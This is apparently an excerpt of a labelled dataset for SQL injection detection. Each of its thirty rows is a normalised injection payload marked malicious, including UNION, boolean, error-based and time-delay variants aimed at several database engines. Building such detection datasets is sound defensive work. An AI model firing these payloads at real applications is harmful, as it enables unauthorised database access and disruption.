row_index,payload_norm,label,sqli_type_hint
7200,"1"" ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ""jebr"" like ""jebr",1,
7201,"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",1,
7202,-8069' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 'qbvz' = 'qbvz,1,
7203,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ""%"" = """,1,
7204,"-6890"" ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""ftho"" like ""ftho",1,
7205,"1%' ) ) union all select null,null,null--",1,
7206,-3998' ) ) or 3038 = 3038,1,
7207,"-2862' ) ) ) union all select 6649,6649--",1,
7208,"1 ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 3003 = 3003",1,
7209,"1 where 3175 = 3175 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
7210,( select ( case when ( 6986 = 6986 ) then 6986 else 6986* ( select 6986 from mysql.db ) end ) ),1,
7211,"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) -- kegk",1,
7212,"-9583' ) ) union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",1,
7213,1%' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( '%' = ',1,
7214,1%' and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,
7215,"-5391 or make_set ( 9354 = 9354,7185 ) # ptyy",1,
7216,"-5322"" union all select 6494,6494,6494,6494,6494,6494--",1,
7217,select sleep ( 5 ) and ( ( ( 8354 = 8354,1,
7218,"1 and elt ( 4249 = 4249,7259 ) -- meef",1,
7219,1' in boolean mode ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) #,1,
7220,"1"" ) as ypfa where 6128 = 6128",1,
7221,1'+ ( select plhk where 6540 = 6540,1,
7222,"-3102 ) union all select 6707,6707,6707,6707--",1,
7223,"1 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) # dwxl",1,
7224,"-9634' ) ) ) union all select 4141,4141#",1,
7225,"-5640"" ) ) or 9792 = 2728--",1,
7226,"1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and 'ctac' like 'ctac",1,
7227,-5764 or 3038 = 3038,1,
7228,select ( case when ( 4996 = 1734 ) then 1 else 4996* ( select 4996 from master..sysdatabases ) end ) --,1,
7229,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""snwx"" like ""snwx",1,
